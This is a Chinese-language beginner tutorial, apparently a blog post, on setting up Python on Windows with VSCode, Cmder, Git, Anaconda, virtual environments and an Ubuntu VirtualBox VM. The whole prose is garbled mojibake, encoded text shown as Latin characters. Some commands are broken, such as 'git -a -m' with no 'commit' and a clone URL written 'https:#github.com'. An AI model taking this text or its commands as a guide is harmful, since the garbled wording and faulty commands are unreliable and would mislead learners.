    <content><![CDATA[å‰è¨€å¦‚ä½•è¨­å®šé–‹ç™¼ç’°å¢ƒæ‡‰è©²æ˜¯æ¯å€‹åˆå­¸ç¨‹å¼è¨­è¨ˆè€…çš„ç—›ï¼ˆå³ä¾¿æ˜¯è€æ‰‹æœ‰æ™‚ä¹Ÿæœƒè¦ºå¾—è‹¦æƒ±ï¼‰ï¼Œå°¤å…¶ç•¶ä½ éœ€è¦åœ¨çµ‚ç«¯æ©Ÿï¼ˆterminalï¼‰è¼¸å…¥æŒ‡ä»¤ï¼ˆcommandï¼‰ä¾†æ“æ§ä½ çš„æŒ‡ä»¤æ™‚ï¼ˆå¥½å§ï¼Œè‹¥ä½ å®Œå…¨åªèµ°åœ–å½¢åŒ–ä»‹é¢ï¼Œç¿’æ…£ GUI æ“ä½œå°±å¦ç•¶åˆ¥è«–ï¼Œä½†è‹¥ä½ æœ‰å¿—æ–¼å¾€ç¨‹å¼è¨­è¨ˆé ˜åŸŸç™¼å±•ï¼Œå»ºè­°é‚„æ˜¯ç†Ÿæ‚‰ä¸€ä¸‹æŒ‡ä»¤ç¢¼ï¼‰ã€‚
è¦åœ¨ Linuxã€Mac OS é€™ç¨®å±¬æ–¼é¡ Unix ç³»çµ±ï¼ˆæŒ‡å„ç¨® Unix çš„è¡ç”Ÿç³»çµ±ï¼Œè€Œ Unix æŒ‡çš„æ˜¯ä¸€ç¨®é›»è…¦ä½œæ¥­ç³»çµ±ï¼Œå…·æœ‰å¤šå·¥ã€å¤šä½¿ç”¨è€…çš„ç‰¹è‰²ï¼Œæ˜¯è¨±å¤šä½œæ¥­ç³»çµ±çš„çˆ¶è¦ªï¼‰ä¸Šæ‰“é€  Python é–‹ç™¼ç’°å¢ƒç›¸å°å®¹æ˜“ï¼Œä½†ç•¶ä½ ä½¿ç”¨ Windows ä½œæ¥­ç³»çµ±ä¸¦å¸Œæœ›åœ¨çµ‚ç«¯æ©Ÿä¸‹æŒ‡ä»¤æ“ä½œæˆ–é–‹ç™¼æ‡‰ç”¨ç¨‹å¼æ™‚ï¼Œå¾€å¾€å—é™æ–¼ç’°å¢ƒè€Œç”¢ç”Ÿè¨±å¤šå›°é›£å’Œèª¤è¸©åœ°é›·ã€‚å› æ­¤ï¼Œæ¥ä¸‹ä¾†æœ¬æ–‡å°‡æ•™å¤§å®¶å¦‚ä½•åœ¨ Windows æ‰“é€ å±¬æ–¼è‡ªå·±çš„ Python é–‹ç™¼ç’°å¢ƒï¼ˆåŒ…å«ä¸€èˆ¬ Winodows å®‰è£å’Œä½¿ç”¨è™›æ“¬æ©Ÿåœ¨ Windows ç’°å¢ƒä¸‹å»ºç«‹ Linux&#x2F;Ubuntu ä½œæ¥­ç³»çµ±ï¼Œé–‹ç™¼ Python ç¨‹å¼ä¸€èˆ¬å»ºè­°ä½¿ç”¨ Linux&#x2F;Ubuntu ç’°å¢ƒé¿å…ç’°å¢ƒè¨­å®šé™¤éŒ¯å›°æ“¾ï¼‰ï¼
é–‹å§‹å»ºç½® Python é–‹ç™¼ç’°å¢ƒæ‰€è¬‚å·¥æ¬²å–„å…¶äº‹ï¼Œå¿…å…ˆåˆ©å…¶å™¨ï¼Œåœ¨é–‹å§‹ä¹‹å‰æˆ‘å€‘å¿…é ˆå…ˆå»ºç½®ç›¸é—œçš„é–‹ç™¼ç’°å¢ƒï¼Œè®“è‡ªå·±å¾éº»ç“œï¼ˆä¸æœƒå¯«ç¨‹å¼çš„äººï¼‰è®Šæˆæ“æœ‰ç¨‹å¼é­”åŠ›çš„é­”æ³•å¸«ã€‚ä»¥ä¸‹ä»‹ç´¹æˆ‘å€‘åœ¨æ¥ä¸‹ä¾†é–‹ç™¼ Python Web æ‡‰ç”¨ç¨‹å¼æ‰€éœ€è¦å®‰è£çš„é–‹ç™¼ç’°å¢ƒå·¥å…·ï¼ˆå¼·çƒˆå»ºè­°ä½¿ç”¨ Virtual Box è™›æ“¬æ©Ÿæ­é… Linux&#x2F;Ubuntu ç’°å¢ƒï¼Œè‹¥ä½ çœŸçš„å¾ˆæƒ³ä½¿ç”¨ Windows ç’°å¢ƒå°±ç¹¼çºŒå¾€ä¸‹çœ‹å§ï¼ï¼‰ã€‚

Microsoft VSCode ç·¨è¼¯å™¨ Microsoft VSCode æ˜¯ Microsoft æ¨å‡ºçš„ç·¨è¼¯å™¨ï¼ˆéæ•´åˆé–‹ç™¼ç’°å¢ƒ IDEï¼‰ï¼Œå¤¾å¸¶è‘— Microsoft éå»æ‰“é€  Visual studio æ•´åˆé–‹ç™¼ç’°å¢ƒçš„è±å¯Œç¶“é©—ï¼Œç›¸æ¯” Sublime Text å’Œå…¶ä»–ç·¨è¼¯å™¨ï¼ŒVSCode çš„å„ªå‹¢åœ¨æ–¼é–‹æºä¸”æ´»èºçš„é–‹ç™¼ç¤¾ç¾¤ã€å…§å»º debugger æ¡†æ¶ã€åŸç”Ÿ Git æ•´åˆã€å¥—ä»¶æ•´åˆå®¹æ˜“ç­‰ç‰¹æ€§ã€‚ç¶œåˆä»¥ä¸Šå¹¾é»ï¼Œå°æ–¼åˆå­¸è€…ä¾†èªª VSCode æ˜¯ä¸€å€‹è »é©åˆå…¥é–€çš„é–‹ç™¼ç’°å¢ƒã€‚å®ƒçš„å®‰è£æ–¹å¼ä¹Ÿååˆ†ç°¡æ˜“ï¼Œåœ¨å®˜ç¶²ä¸‹è¼‰å¾ŒæŒ‰ç…§æŒ‡ç¤ºå®‰è£å®Œæˆå³å¯ï¼Œä¸‹è¼‰å®Œæˆå¾Œå¯ä»¥æ‰“é–‹çœ‹çœ‹ã€‚
  
 æˆ‘å€‘å¯ä»¥é»é¸å·¦é‚Š icon æ¬„çš„ç¬¬äº”å€‹ï¼ˆé•·å¾—åƒæ­£æ–¹å½¢æ‹¼åœ–ï¼‰ï¼Œå®‰è£ Python èªæ³•å’Œæ ¼å¼æª¢æŸ¥çš„ç›¸é—œå¥—ä»¶å¹«åŠ©é™¤éŒ¯ï¼ˆæœå°‹ Pythonï¼‰ï¼Œé¸æ“‡ Python ä¸¦é»é¸ install å®‰è£ï¼š
  
 ä½ ä¹Ÿå¯ä»¥æ–¼æª”æ¡ˆï¼ˆfileï¼‰-&gt; é–‹å•Ÿï¼ˆopenï¼‰æ‰“é–‹ä½ åœ¨é›»è…¦ä¸­å·²ç¶“æº–å‚™å¥½çš„å°ˆæ¡ˆè³‡æ–™å¤¾ï¼ŒåŒæ™‚ä¹Ÿå¯ä»¥åœ¨è³‡æ–™å¤¾ä¸­æ–°å¢æª”æ¡ˆï¼Œæˆ‘å€‘ä¹‹å¾Œçš„ç¨‹å¼ä¹Ÿæœƒå¸Œæœ›åœ¨å»ºç«‹å¥½çš„å°ˆæ¡ˆè³‡æ–™å¤¾ä¸­é€²è¡Œé–‹ç™¼ã€‚é€™é‚Šæˆ‘å€‘å»ºç«‹ä¸€å€‹ hello.py çš„æª”æ¡ˆä¸¦å°å‡º hello è¨Šæ¯ã€‚
 hello.pyprint(&#x27;hello python&#x27;)

çµ‚ç«¯æ©Ÿç’°å¢ƒï¼ˆiTterm&#x2F;å…§å»º terminalï¼‰ terminalï¼ˆçµ‚ç«¯æ©Ÿï¼‰æ˜¯æˆ‘å€‘ä¸‹æŒ‡ä»¤çš„åœ°æ–¹ï¼Œè¨±å¤šæ™‚å€™æˆ‘å€‘é€²è¡Œç¨‹å¼é–‹ç™¼æ™‚ä¸æœƒä½¿ç”¨ GUI åœ–å½¢åŒ–ä»‹é¢è€Œæ˜¯ä½¿ç”¨ä¸‹æŒ‡ä»¤æ–¹å¼è«‹é›»è…¦åšç›¸å°æ‡‰çš„è¡Œç‚ºï¼ˆè¨˜å¾—å¯«ç¨‹å¼å°±æ˜¯ä¸‹æŒ‡ä»¤è«‹é›»è…¦åšäº‹æƒ…ï¼ï¼‰ã€‚åœ¨ Linux å’Œ Mac è£¡é¢éƒ½æœ‰å…§å»ºçš„ terminal çš„æ‡‰ç”¨ç¨‹å¼ï¼Œä»¥ä¸‹ç‚º MacOS çš„ iTerm2 çµ‚ç«¯æ©Ÿä¸‹æŒ‡ä»¤ç¤ºæ„åœ–ï¼ˆiTerm2 ä¸­ $ ç‚ºæç¤ºå­—å…ƒï¼Œä¸ç”¨è¼¸å…¥ï¼‰ï¼š
  
 ä½¿ç”¨ Windows è®€è€…å¯ä»¥ä½¿ç”¨ Cmder é€™å€‹è»Ÿé«”ç•¶åšçµ‚ç«¯æ©Ÿç’°å¢ƒã€‚
  
 æ¯”èµ· Winodws å…§å»ºçš„å‘½ä»¤åˆ— CMDï¼Œcmder æ›´è²¼è¿‘ Unix çš„å‘½ä»¤åˆ—æŒ‡ä»¤ç¢¼ï¼š
  
 é¦–å…ˆåˆ° Cmder å®˜ç¶²å…ˆå®‰è£ Cmder Full ç‰ˆæœ¬ï¼ˆå« gitï¼‰ï¼Œå®‰è£å®Œæˆå¾Œè§£å£“ç¸®è³‡æ–™å¤¾åˆ°æ¡Œé¢ï¼ŒåŸ·è¡Œè£¡é¢çš„ cmder.exe æª”æ¡ˆå³å¯ã€‚
  
 Cmder é è¨­æ˜¯ Î»ï¼Œå¦‚æœä¸ç¿’æ…£å¯ä»¥æ”¹æˆ Mac &#x2F; Linux ç’°å¢ƒä¸‹çš„ $ï¼Œå…·é«”æµç¨‹è«‹åƒè€ƒé€™ä»½æ–‡ä»¶ã€‚
  
 å°æ–¼æœ‰å¿—æ–¼å¾äº‹ç¨‹å¼é–‹ç™¼ç›¸é—œå·¥ä½œçš„è®€è€…å»ºè­°å¯ä»¥å¤šç†Ÿæ‚‰æŒ‡ä»¤ç¢¼çš„è¼¸å…¥ï¼Œæ›´å¤šæŒ‡ä»¤ç¢¼å¯ä»¥åƒè€ƒé³¥å“¥æ’°å¯«çš„ Linux åŸºæœ¬æŒ‡ä»¤ä»‹ç´¹ å’Œ Linux å­¸ç¿’è³‡æºã€‚
 ä»¥ä¸‹æ˜¯å¸¸ç”¨æŒ‡ä»¤# ç§»å‹•åˆ°æ¡Œé¢cd \Users\XXXX\Desktop# åˆ—å‡ºè³‡æ–™å¤¾ä¸‹æª”æ¡ˆls# åˆªé™¤æª”æ¡ˆrm æª”å# è¤‡è£½æª”æ¡ˆcp æª”å


Git ç‰ˆæœ¬æ§åˆ¶ç³»çµ±&#x2F;è¨»å†Š GitHub å¸³æˆ¶ Git æ˜¯ä¸€ç¨®åˆ†æ•£å¼ç‰ˆæœ¬æ§åˆ¶ç³»çµ±ï¼Œå¯ä»¥è®“æˆ‘å€‘å¯ä»¥æ›´æ–¹ä¾¿åœ°ç®¡ç†æˆ‘å€‘çš„ç¨‹å¼ç¢¼ã€‚åœ¨ç¶²è·¯ä¸Šæœ‰éå¸¸å¤šå„ªç§€çš„ Git æ•™å­¸æ–‡ä»¶ï¼ˆé€£çŒ´å­éƒ½èƒ½æ‡‚çš„Gitå…¥é–€æŒ‡å—ã€å¯«çµ¦å¤§å®¶çš„ Git æ•™å­¸ã€åˆå¿ƒè€… Git ä¸Šæ‰‹æ”»ç•¥ï¼‰ã€‚å®‰è£ Git æ–¹å¼æ˜¯åˆ°å®˜ç¶²ä¸‹è¼‰è»Ÿé«”ï¼Œä¾ç…§æŒ‡ç¤ºå®‰è£ï¼ˆè‹¥æ‚¨ä½¿ç”¨ Cmder çš„å®Œæ•´å®‰è£ Download Full çš„ç‰ˆæœ¬å°±ä¸ç”¨å®‰è£ gitï¼Œå› ç‚ºå·²ç¶“å¹«ä½ å®‰è£å¥½äº†ï¼‰ã€‚
  
 äº’å‹•å¼èªæ³•å­¸ç¿’ï¼š
  
 åœ¨ä»‹ç´¹å®Œ git ä¹‹å¾Œæˆ‘å€‘ä¾†äº†è§£ä¸€ä¸‹ GitHubã€‚GitHub æ˜¯ä¸€å€‹å¯ä»¥å­˜æ”¾ git ç¨‹å¼ç¢¼å°ˆæ¡ˆçš„å¹³å°ï¼Œé€é GitHub æˆ‘å€‘å¯ä»¥æ¥è§¸åˆ°æœ€æ–°çš„é–‹æ”¾åŸå§‹ç¢¼è³‡è¨Šï¼Œä¹Ÿå¯ä»¥å°‡æˆ‘å€‘çš„ç¨‹å¼ç¢¼é–‹æºå‡ºä¾†ã€‚
  
 å¾ GitHub ä¸Šè¤‡è£½ç¨‹å¼ç¢¼
 

 # è¤‡è£½ä¸€ä»½åˆ°æœ¬åœ°ç«¯$ git clone https:#github.com/kdchang/python101.git# ç§»å‹•åˆ°è³‡æ–™å¤¾$ cd python101

 å¸¸è¦‹ Git æŒ‡ä»¤ï¼š
 # åˆå§‹åŒ–å°ˆæ¡ˆ$ git init# æŸ¥çœ‹ç‹€æ…‹$ git status# æª¢æŸ¥å·®ç•°$ git diff # å°‡è®Šæ›´æª”æ¡ˆæ”¾å…¥æš«å­˜å€$ git add index.py# ä½¿ç”¨ commit -m æäº¤è®Šæ›´$ git -a -m &#x27;init commit&#x27;# æŸ¥çœ‹æ­·å²$ git log# æ”¾æ£„å·²ç¶“ commit çš„æª”æ¡ˆé‡å›æš«å­˜å€$ git reset HEAD index.py# æ”¾æ£„æª”æ¡ˆè®Šæ›´$ git checkout index.py

Anaconda Python3 ç‰ˆæœ¬ Anaconda æ˜¯ä¸€å€‹ all-in-one çš„ Python é–‹ç™¼ç’°å¢ƒï¼Œå°æ–¼åˆå­¸è€…ä¾†èªªæ˜¯å€‹ååˆ†åˆé©çš„é–‹ç™¼ç’°å¢ƒåŒ…ã€‚Anaconda å…·å‚™äº†å¹¾é …ç‰¹é»ï¼š
 - ä¾¿æ–¼å®‰è£è¨±å¤šæµè¡Œçš„ç§‘å­¸ã€æ•¸å­¸ã€å·¥ç¨‹ã€è³‡æ–™åˆ†æçš„ Python æ¨¡çµ„  
 - å…è²»ä¸¦æ”¯æ´è·¨å¹³å°ï¼šLinuxã€Windowsã€Mac
 - å…§å»º Spyder ç·¨è¼¯å™¨å’Œ Jupyter Notebook ç’°å¢ƒ 
 - æ–¹ä¾¿å»ºç«‹ä¸åŒçš„è™›æ“¬é–‹ç™¼ç’°å¢ƒ

 å®‰è£æµç¨‹ä¹Ÿååˆ†ç°¡å–®ï¼Œé€²å…¥ Anaconda é¦–é ï¼Œé¸æ“‡å°æ‡‰ä½œæ¥­ç³»çµ±ï¼ˆé€™é‚Šä½¿ç”¨ Windowsï¼‰å’Œæ˜¯å±¬æ–¼ 64 é‚„æ˜¯ 32 ä½å…ƒï¼š 
 Windows10 å¯ä»¥åœ¨ç³»çµ±çœ‹åˆ°ä½å…ƒè³‡è¨Šï¼›  
 Windows7 å¯ä»¥åœ¨æ§åˆ¶å°-&gt;ç³»çµ±èˆ‡å®‰å…¨-&gt;ç³»çµ±è§€çœ‹ä½œæ¥­ç³»çµ±ä½å…ƒè³‡è¨Šï¼š  
 é¸æ“‡å°æ‡‰ Python ç‰ˆæœ¬ä¸‹è¼‰ï¼ˆé€™è£¡é¸æ“‡ Python3 ä»¥ä¸Šç‰ˆæœ¬ï¼‰ï¼Œæˆ‘å€‘ä½¿ç”¨ Graphical Installerï¼ˆåœ–åƒä»‹é¢å®‰è£æ–¹å¼ï¼‰ï¼Œæ¥è‘—åœ¨ä¸‹è¼‰å®Œæˆæ™‚æŒ‰ç…§é è¨­çš„å®‰è£æ–¹å¼å®Œæˆå®‰è£ï¼›  
 è¨˜å¾—å®‰è£æ™‚è¦æ³¨æ„å»ºè­°åœ¨å®‰è£ anaconda æ™‚å‹¾é¸æŠŠç’°å¢ƒè®Šæ•¸åŠ å…¥ï¼ˆpath environment variableï¼‰ï¼Œé€™æ¨£åœ¨ä½¿ç”¨ cmder æ™‚ä½¿ç”¨ conda ç›¸é—œæŒ‡ä»¤æ‰ä¸æœƒå‡ºç¾éŒ¯èª¤ï¼Œè‹¥ä¸€é–‹å§‹æ²’æœ‰å‹¾é¸çš„è©±å»ºè­°è§£é™¤å®‰è£å¾Œå†é‡æ–°å®‰è£ anaconda å‹¾é¸åŠ å…¥ç’°å¢ƒè®Šæ•¸ã€‚
  
 è‹¥æ˜¯å®Œæ•´å®‰è£æˆåŠŸï¼Œå¯ä»¥æ‰“é–‹ Cmder çµ‚ç«¯æ©Ÿè¼¸å…¥ï¼Œè‹¥æ˜¯é¡¯ç¤º Python 3.6.0 :: Anaconda 4.3.0 (x86_64) ç‰ˆæœ¬è™Ÿå³å®‰è£æˆåŠŸï¼ˆè‹¥æ²’æˆåŠŸå¯èƒ½è¦æª¢æŸ¥ä¸€ä¸‹æ˜¯ä¸æ˜¯ç’°å¢ƒè®Šæ•¸è·¯å¾‘çš„å•é¡Œï¼‰ï¼š
 $ python -VPython 3.6.0 :: Anaconda 4.3.0 (x86_64)

 æ¥è‘—è¦å»ºç«‹æˆ‘å€‘å°ˆæ¡ˆè™›æ“¬ç’°å¢ƒï¼Œé€™æ¨£åœ¨å®‰è£æ“ä½œå¥—ä»¶æ™‚æ¯”è¼ƒä¸å®¹æ˜“è¢«æ±¡æŸ“åˆ° root å…¨åŸŸçš„ç’°å¢ƒï¼ˆå› ç‚ºä½ å¯èƒ½æœƒæœ‰å¾ˆå¤šå°ˆæ¡ˆï¼Œå°ˆæ¡ˆä½¿ç”¨çš„å¥—ä»¶ä¸ç›¡ç›¸åŒï¼Œæ­£å¼ä¸Šç·šæ™‚åªè¦æŠŠç›¸é—œå¥—ä»¶è³‡è¨Šé€é pip freeze &gt; requirements.txt å­˜èµ·ä¾†ï¼Œç„¶å¾Œåœ¨æ­£å¼ä¸Šç·šçš„ä¼ºæœå™¨å®‰è£ pip install -r requirements.txt å³å¯ï¼‰ï¼Œå•Ÿå‹•å¾Œæœƒå‡ºç¾ï¼ˆå¥—ä»¶åç¨±ï¼‰çš„æç¤ºå­—å…ƒï¼š
 é¡¯ç¤ºç›®å‰è™›æ“¬ç’°å¢ƒåˆ—è¡¨conda info -e å‰µå»ºè™›æ“¬ç’°å¢ƒconda create -n å¥—ä»¶åç¨± python=3.6é€²å…¥è™›æ“¬ç’°å¢ƒï¼ˆè‹¥æ˜¯é Windows cmder ç’°å¢ƒåŠ  source æ–¼é–‹é ­ï¼‰ ï¼ŒæˆåŠŸå¾Œæç¤ºå­—å…ƒè®Šæˆï¼šï¼ˆå¥—ä»¶åç¨±ï¼‰$activate è™›æ“¬ç’°å¢ƒåç¨±é›¢é–‹è™›æ“¬ç’°å¢ƒï¼ˆè‹¥æ˜¯é Windows cmder ç’°å¢ƒåŠ  source æ–¼é–‹é ­ï¼‰ deactivate 

å»ºç«‹è™›æ“¬ç’°å¢ƒï¼ˆvirtual environmentï¼‰æ¥è‘—æˆ‘å€‘æ­£å¼ä¾†å»ºç«‹ä¸€å€‹ Python çš„å°ˆæ¡ˆï¼Œæ‰“é–‹çµ‚ç«¯æ©Ÿç§»å‹•åˆ°æ¡Œé¢ï¼Œå»ºç«‹å°ˆæ¡ˆè³‡æ–™å¤¾ï¼ˆåœ¨è¼¸å…¥æŒ‡ä»¤æ™‚å¯ä»¥ä½¿ç”¨ tab è‡ªå‹•è£œå®ŒæŒ‡ä»¤ï¼‰
# ç§»å‹•åˆ°æ¡Œé¢cd \Users\XXXX\Desktop# å»ºç«‹è³‡æ–™å¤¾mkdir python_examples# ç§»å‹•åˆ°è³‡æ–™å¤¾cd python_examples

å»ºç«‹ç¨ç«‹è™›æ“¬ç’°å¢ƒï¼Œä¸¦é€²å…¥è™›æ“¬ç’°å¢ƒï¼š
# å‰µç«‹è™›æ“¬ç’°å¢ƒconda create -n python_examples_venv python# å•Ÿå‹•è™›æ“¬ç’°å¢ƒactivate python_examples_venv

æˆåŠŸé€²å…¥è™›æ“¬ç’°å¢ƒå¾Œï¼ˆæœƒå‡ºç¾å°æ‹¬è™Ÿ python_examples_venvï¼‰ä»£è¡¨å·²ç¶“é€²å…¥è™›æ“¬ç’°å¢ƒï¼Œå³å¯ä»¥åœ¨è£¡é¢åŸ·è¡Œ Python ç¨‹å¼ä¸¦å®‰è£ç›¸é—œå¥—ä»¶æ–¼è©²è™›æ“¬ç’°å¢ƒä¸‹ï¼š
# å®‰è£ django web æ¡†æ¶å¥—ä»¶pip install django# åŸ·è¡Œ python æª”æ¡ˆpython hello.py

äº‹å¯¦ä¸Šï¼Œåœ¨ Python3 ä¸­é‚„æœ‰å¦å¤–å…©ç¨®å»ºç«‹è™›æ“¬é–‹ç™¼ç’°å¢ƒçš„æ–¹å¼ï¼ŒåŒ…æ‹¬ä½¿ç”¨ Python å…§å»ºå·¥å…·ï¼š
# ä½¿ç”¨ Python3 å…§å»ºå·¥å…·å»ºç«‹åç‚º example_venv çš„è™›æ“¬é–‹ç™¼ç’°å¢ƒpython -m venv example_venv

ä½¿ç”¨ virtualenvï¼Œå’Œ anaconda ä¸åŒçš„æ˜¯ virtualenv æœƒåœ¨å»ºç«‹è™›æ“¬ç’°å¢ƒçš„å°ˆæ¡ˆè³‡æ–™å¤¾ä¸‹å»ºç«‹ä¸€å€‹è³‡æ–™å¤¾è£¡é¢æ”¾è™›æ“¬ç’°å¢ƒçš„æ±è¥¿ï¼š
# å…ˆå®‰è£ virtualenvpip install virtualenv# ä½¿ç”¨ virtualenv ç”¢ç”Ÿä¸€å€‹åç‚º example_venv çš„virtualenv example_venv# ç§»å‹•åˆ° example_venv çš„å¤–é¢è³‡æ–™å¤¾ï¼ŒåŸ·è¡Œé€²å…¥è™›æ“¬ç’°å¢ƒexample_venv\Scripts\activate# å®‰è£ django web æ¡†æ¶å¥—ä»¶åˆ°è™›æ“¬ç’°å¢ƒä¸­ï¼ˆåªæœƒå®‰è£åœ¨è©²è™›æ“¬ç’°å¢ƒä¸­ï¼‰pip install django

æ•´åˆåœ¨ä¸€èµ·ï¼šåœ¨ Windows æ’°å¯«ä½ çš„ç¬¬ä¸€å€‹ Python ç¨‹å¼ç¢ºèªå®‰è£å¥½ä»¥ä¸‹å·¥å…·å¾Œï¼Œæˆ‘å€‘å°±å¯ä»¥é–‹å§‹æ’°å¯«ä½ çš„ç¬¬ä¸€å€‹ Python ç¨‹å¼

å®‰è£ Microsoft VSCode
å®‰è£ Cmder
å®‰è£ Anacondaï¼ˆè¨˜å¾—å‹¾é¸åŠ å…¥ç’°å¢ƒè®Šæ•¸ï¼‰
å®‰è£ virtualenv (åœ¨çµ‚ç«¯æ©Ÿä½¿ç”¨ï¼špip install virtualenv å®‰è£)
åœ¨æ¡Œé¢å‰µå»ºä¸€å€‹ python_example è³‡æ–™å¤¾ï¼Œæ‰“é–‹ Microsoft VSCode å¾Œé–‹å•Ÿè©²å°ˆæ¡ˆè³‡æ–™å¤¾ï¼Œå‰µå»ºä¸€å€‹ hello.py çš„æª”æ¡ˆä¸¦åœ¨è£¡é¢æ‰“ä¸Š print(&#39;hello python!!&#39;)
æ‰“é–‹ cmder çµ‚ç«¯æ©Ÿ cd ç§»å‹•åˆ° hello.py æ‰€åœ¨è³‡æ–™å¤¾
åŸ·è¡Œ python hello.pyï¼Œæ­å–œä½ å®Œæˆç¬¬ä¸€å€‹ Python ç¨‹å¼ï¼

åœ¨ Windows ä¸Šå®‰è£ Linux&#x2F;Ubuntu
å®‰è£ VirtualBox å°æ‡‰ç‰ˆæœ¬è™›æ“¬æ©Ÿï¼ˆé€™é‚Šå®‰è£ Windows ç‰ˆæœ¬ï¼Œè‹¥ä½ æ˜¯ Mac æƒ³å˜—è©¦ Linux ä¹Ÿå¯ä»¥å®‰è£ Mac ç‰ˆæœ¬ï¼‰ï¼Œä¸‹è¼‰å®ŒæŒ‰ç…§æ­¥é©Ÿå®‰è£å®Œæˆ
  

åˆ°å®˜ç¶²ä¸‹è¼‰ Linux&#x2F;Ubuntu å…‰ç¢Ÿæ˜ åƒæª”æ¡ˆï¼Œè«‹æ ¹æ“šé›»è…¦ä½å…ƒæ¶æ§‹é¸æ“‡æœ€æ–°æ¡Œé¢ç©©å®šç‰ˆæœ¬ 16.04 LTSï¼ˆfor windowsï¼‰
  

å»ºç«‹ Linux Ubuntu è™›æ“¬æ©Ÿï¼Œå¯ä»¥åƒè€ƒé€™ç¯‡ VirtualBox è™›æ“¬æ©Ÿå™¨å®‰è£ Ubuntu è¨­å®šæ•™å­¸ï¼Œè¨­å®šä¸€ä¸‹åç¨±ã€ä½œæ¥­ç³»çµ±é¡å‹å’Œç‰ˆæœ¬ï¼Œæ¬²åˆ†é…çµ¦è™›æ“¬çš„è¨˜æ†¶é«”å¤§å°ï¼ˆå»ºè­°èª¿æ•´ç‚ºå¤§ç´„å¯¦é«”è¨˜æ†¶é«”çš„ 1&#x2F;3ï¼Œèˆ‰ä¾‹ä¾†èªªä½ æœ‰ 30G è¨˜æ†¶é«”ï¼Œå¯ä»¥åˆ†é… 10G çµ¦è™›æ“¬æ©Ÿï¼‰ã€‚æ¥è‘—é¸æ“‡ç«‹å³å»ºç«‹è™›æ“¬ç¡¬ç¢Ÿã€VDI (VirtualBox ç£ç¢Ÿæ˜ åƒ)ã€å‹•æ…‹é…ç½®ç¡¬ç¢Ÿå¤§å°ä¸æœƒé€ æˆæµªè²»ï¼ˆè™›æ“¬ç¡¬ç¢Ÿå®¹é‡å»ºè­° 30G ä»¥ä¸Šï¼‰ã€‚
  

é¸æ“‡å»ºç«‹å¥½çš„è™›æ“¬æ©Ÿä¸¦é¸è¨­å®šå€¼æŒ‰éˆ•ï¼Œé¸æ“‡å­˜æ”¾ä½ç½®é¸é …ï¼Œæ§åˆ¶å™¨ä¸­é¸æ“‡è™›æ“¬ CD&#x2F;DVD æª”æ¡ˆé¸æ“‡å‰›å‰›å¾å®˜ç¶²ä¸‹è¼‰ä¸‹ä¾†çš„æª”æ¡ˆï¼Œç¢ºå®šå¾Œæ¥è‘—é¸æ“‡è™›æ“¬æ©Ÿä¸¦å•Ÿå‹•ï¼Œæ¥ä¸‹ä¾†é¸æ“‡å®‰è£ Linux&#x2F;Ubuntuï¼Œé¸æ“‡ç«‹å³å®‰è£å’Œé è¨­å€¼ï¼Œéœ€è¦ä¸€æ®µæ™‚é–“å®‰è£å’Œè¨­å®šï¼ˆä¸­é–“æœƒæœ‰èªè¨€ç›¸é—œçš„é¸æ“‡å’Œå¯†ç¢¼è¨­å®šï¼‰
  

å•Ÿå‹•ä½¿ç”¨ Linux&#x2F;Ubuntuï¼ŒæŒ‰ç…§ä¸Šé¢æ•™å­¸å®‰è£ Microsoft VSCode ç·¨è¼¯å™¨ï¼Œå®‰è£ Anacondaï¼Œå»ºç«‹ç¬¬ä¸€å€‹ Python æª”æ¡ˆã€æ‰“é–‹çµ‚ç«¯æ©Ÿï¼ˆtermicalï¼‰å®‰è£ ï¼ŒåŸ·è¡Œ Python ç¨‹å¼
 


ç¶²è·¯ä¸Šä¹Ÿæœ‰è¨±å¤šç›¸é—œåƒè€ƒæ•™å­¸æ–‡ç« ï¼šVirtualBox 5.2å®‰è£Ubuntu 16.04 ç›¸é—œæ•™å­¸ã€VirtualBox è™›æ“¬æ©Ÿå™¨å®‰è£ Ubuntu è¨­å®šæ•™å­¸
è‹¥æ˜¯è¢å¹•å¤ªå°å¯ä»¥åœ¨ä¸Šæ’é¸å–®ä¸­é¸æ“‡ï¼šè£ç½®-&gt;æ’å…¥ Guest Additions CD æ˜ åƒ...-&gt;åŸ·è¡Œ-&gt;é‡é–‹è™›æ“¬æ©Ÿ-&gt;å¯ä»¥èª¿æ•´å¤§å°ã€‚
æ•´åˆåœ¨ä¸€èµ·ï¼šç”¨ Linux æ’°å¯«ä½ çš„ç¬¬ä¸€å€‹ Python ç¨‹å¼ç¢ºèªå®‰è£å¥½ä»¥ä¸‹å·¥å…·å¾Œï¼Œæˆ‘å€‘å°±å¯ä»¥é–‹å§‹æ’°å¯«ä½ çš„ç¬¬ä¸€å€‹ Python ç¨‹å¼

é€²å…¥è™›æ“¬æ©Ÿçš„ Linux&#x2F;Ubuntu 
å®‰è£ Microsoft VSCode
å®‰è£ Anacondaï¼ˆè¨˜å¾—å‹¾é¸åŠ å…¥ç’°å¢ƒè®Šæ•¸ï¼‰
å®‰è£ virtualenv (åœ¨çµ‚ç«¯æ©Ÿä½¿ç”¨ï¼špip install virtualenv å®‰è£)
åœ¨æ¡Œé¢å‰µå»ºä¸€å€‹ python_example è³‡æ–™å¤¾ï¼Œæ‰“é–‹ Microsoft VSCode å¾Œé–‹å•Ÿè©²å°ˆæ¡ˆè³‡æ–™å¤¾ï¼Œå‰µå»ºä¸€å€‹ hello.py çš„æª”æ¡ˆä¸¦åœ¨è£¡é¢æ‰“ä¸Š print(&#39;hello python!!&#39;)
æ‰“é–‹ terminal çµ‚ç«¯æ©Ÿ cd ç§»å‹•åˆ° hello.py æ‰€åœ¨è³‡æ–™å¤¾
åŸ·è¡Œ python hello.pyï¼Œæ­å–œä½ å®Œæˆç¬¬ä¸€å€‹ Python ç¨‹å¼ï¼

